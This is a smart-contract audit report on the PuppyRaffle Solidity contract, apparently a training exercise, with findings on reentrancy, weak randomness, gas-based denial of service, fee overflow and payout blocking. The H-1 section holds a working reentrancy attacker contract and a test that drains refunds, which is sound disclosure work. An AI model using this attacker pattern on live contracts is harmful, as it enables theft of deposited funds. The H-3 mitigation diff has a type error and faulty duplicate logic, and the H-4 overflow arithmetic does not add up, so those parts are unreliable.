### [H-1] Reentrancy attack in `PuppyRaffle:refund` allows entrant to drain raffle balance

**Description:** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result, enables participants to drain contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that external call do we update `PuppyRaffle::players` array.

```solidity
   function refund(uint256 playerIndex) public {
        // @audit MEV
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        // @audit reentrancy
@>        payable(msg.sender).sendValue(entranceFee);
@>        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```

A player who has  entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. they could continue the cycle till the contract balance is drained.

**Impact** All fees paid by raffle could be stolen by the malicous participant.

**Proof Of Concept**
 1. User enters the raffle
 2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle:refund`.
 3. Attacker enters the rafle/
 4. Attacker calls `PuppyRaffle:refund` from their attack contract, draining the contract


**Proof Of Code**

<details>
  <summary> Code </summary>

  ```solidity
     function test_reentrancyRefund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle);
        address attackerAddr = makeAddr("ATTACKER_ADDRESS");
        vm.deal(attackerAddr, 3 ether);

        uint256 startingBal = attackerAddr.balance;
        vm.prank(attackerAddr);
        attacker.attack{value: entranceFee}();
        uint256 endingBal = attackerAddr.balance;

        console.log(startingBal);
        console.log(endingBal);
    }
  ```

  and this contract as well.

  ```solidity
    contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle puppyRaffle_) {
        puppyRaffle = puppyRaffle_;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    receive() external payable {
        if(address(puppyRaffle).balance >= entranceFee) {
        // this will always execute as long the puppyRaffle contract balance above entranceFee amount
            puppyRaffle.refund(attackerIndex);
        }
    }
}
  ```
</details>

**Recommended Mitigation** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.

```diff
   function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+        players[playerIndex] = address(0);
+        emit RaffleRefunded(playerAddress);
         payable(msg.sender).sendValue(entranceFee);

--        players[playerIndex] = address(0);
--        emit RaffleRefunded(playerAddress);
    }
```

### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows users to influence or predict the winner.

**Description:** Hashing `msg.sender`, `block.timestamp` and `block.difficulty` together creates a predictable find number. A predictable number is not a good random number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.

*Note:* This additionally means users could front-run this function cnd call `refund` if they see are not the winner.

**Impact:** Any user can influence the winner of the raffle, winning the money and selecting the `rarest` puppy. Making the entire raffle worthless if it becomes a gas war as to who wins the raffles.

**Proof of Concept:**

  1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that to predict when/how to participat. See the [solidity blog on prevrandao](https://soliditydeveloper.com/prerandao),
 `block.difficulty` was recently replaced with prevrandao.
  2. User can mine/manipulate their `msg.sender` value to result in their address being used to generated the winner!.
  3. Users can revert their `selectWinner` transaction if they dont like the winner or resulting puppy.

  Using on-chain values as a randomness seed is a [well documented attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ce6472dbdf) in the blockchain space.

**Recommended Mitigation:** Consider using cryptographically provable random number generator such as `Chainlink VRF` 



### [H-3] Checking for address duplications by looping through an array of player addresses in `PuppyRaffle::enterRaffle` is potential of denial of service (DoS) attack. incrementing gas costs for future entrants


IMPACT: MEDIUM/HIGH ( because an attackers will be cost a lot of gas to attack )
LIKELIHOOD: MEDIUM (causing users won't be able to use the service)

**Description** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array us, the more checks a new player will have to make. this means the gas cost for players who enter right when the raffle stats will be dramatically lower than those who enter later.
Every additional address in the `players` array, is an additional check the loop will have to make.
 
 ```solidity
     for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
  ```
 
**Impact** The gas cost for the raffle entrants will greatly increase as more players enter the raffle. Discouraging later users from entering, and causing a rush at the start of a raffle to be one of the first entrants on the queue.


**Proof Of Concept**

 If we have 1 sets of 150 players enter, the gas costs will be as such:
  - 150 players: **`12328080`** gas
  
  it will be more than 3x-5x more expensive for the next 100-1000 players entering raffle.

place this code into `PuppyRaffleTest.t.sol` file and run `forge test --match-test test_denialOfService`.

```solidity
  function test_denialOfService() public  {

     uint256 players = 150;
     address[] memory numOfPlayers = new address[](players);
     for(uint256 i = 0; i < players; i++) {
                numOfPlayers[i] = address(i);
     }

     uint256 gasStart= gasleft();
     puppyRaffle.enterRaffle{value: entranceFee * numOfPlayers.length}(numOfPlayers);
     uint256 gasEnd = gasleft();
     uint256 gasUsed = gasStart - gasEnd;

     console.log(gasUsed);
     console.log("gas start", gasStart);
     console.log("gas end", gasEnd);
  
  } 
     
```
<!-- for mitigation solutions, try to keep the functionality as it is as possible -->
**Recommended Mitigation** There are a few recommendations
 1. Consider allowing duplicates. users can make a new wallet addresses anyways. so a duplicate check doesn't prevent the same person from entering multiple times, only the sama wallet address.
 2. Consider using mapping to check for duplicates. this would allow constant time lookup of whether a user has already entered;

```diff
+  mapping(address => uint256) public addressToRaffleId;
+  uint256 public raffleId = 0;
 .
 .
 .
  function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
+            addressToRaffleId[newPlayers[i]] = address(i);
        }

-        // Check for duplicates
+       // @audit check for duplicates
+        for (uint256 i = 0; i < players.length - 1; i++) {
+            require(addressToRaffleId[players[i]] != raffleId, "PuppyRaffle: Duplicate player");
+        }

-        for (uint256 i = 0; i < players.length - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }


```

Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).


### [H-4] Integer overflow of `PuppyRaffle::totalFees` loses fees.

**Description:** In solidity versions prior to `0.8.0` integers were subject to integer overflows.

  ```solidity
    uint64 myVar = type(uint64).max;
    myVar += 1;
  ```

**Impact:** In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `PuppyRaffle::withdrawFees`. However, if the `totalFees` variable overflows, the `feeAddress` may not the correct amount of fees. leaving fess permanently stuck in the contract.

**Proof of Concept:**
1. We conclude a raffle of 4 players.
2. We then have 89 players enter a new raffle, and conclude the raffle.
3. `totalFees` will be:
```solidity
    totalFees = totalFees + uint64(fee);
    totalFees = 80000000000000000000 + 1780000000000000000000;
    totalFees = 153255920448384;
```
4. you will not be able to withdraw, due to the line in `PuppyRaffle::withdrawFees`:
  ```solidity
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
  ```

  Althought you could use `selfdestruct` to send ETH to this contract in order for the values to match and withdraw the fees, this is clearly not intended design of the protocol. At some point, there will be too much `balance` in the contract that the above `require` will be impossible to hit.

**Recommended Mitigation:** There are a few possible mitigations.
  1. Use a newer version of solidity, and a `uint256` instead of `uint64` for `PuppyRaffle::totalFees`.
  2. You could use also the `SafeMath` library of OpenZeppelin for version 0.7.6 of solidity, however you would still have a hard time with the `uint64` type if too many fees are collected.
  3. Remove the balance check from `PuppyRaffle::withdrawFees`.

```diff
-   require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

### [M-1] Smart contract wallets raffle winner without a `receive` or a `fallback` function will block the start of a new contest.

**Description** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart.

Users could easily call the `selectWinner` function again and non-wallet entrants could enter, but it could cost a lot due to the duplicate check and lottery reset could get very challenging.

**Impact** The `PuppyRaffle::selectWinner` function could revert many times, making lottery reset difficult.

Also, true winner would not get paid out and someone else could take their money.

**Proof Of Concept**

1. 10 smart contract wallets enter the lottery without a fallback or receive function.
2. The lottery ends.
3. The `selectWinner` function would'nt work, even though the lottery is over!.


**Recommended Mitigation**There are a few options to mitigate this issue.

1. Do not allow smart contract wallets entrants (not recommended)
2. Create a mapping of addresses => payout amounts so winners can pull their funds out themselves with a new `claimPrize` function, putting the owness on the winner to claim their prize (Recommended).

> Pull over push

# Low

## [L-2]: `PuppyRaffle:getActivePlayerIndex` returns 0 for non-existent players and for players at index 0, causing a player at index 0 to incorrectly they have not entered the raffle.	

**Description**  If a player is in the `PuppyRaffle::players` array at index 0, this will return 0, but according to the natspec, it will also return 0 if the player is not in the array.

```solidity
  function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }
```


**Impact** A player at index 0 may incorrectly think they have not entered the raffle, and attempt to enter the raffle again, wasting alot of gas.

**Proof Of Concept**
 1. User enter the raffle, they are the first entrant.
 2. `PuppyRaffle::getActivePlayerIndex` returns 0.
 3. Use thinks they not entered correctly due to the function documentation.


**Recommended Mitigation** The easiest recomendation would be to revert if the player is not in the array instead of returning 0.

you could also reserve the 0th position for any competition, but a better solution might be to return an `int256` where the function returns -1 if the player is not active.

 
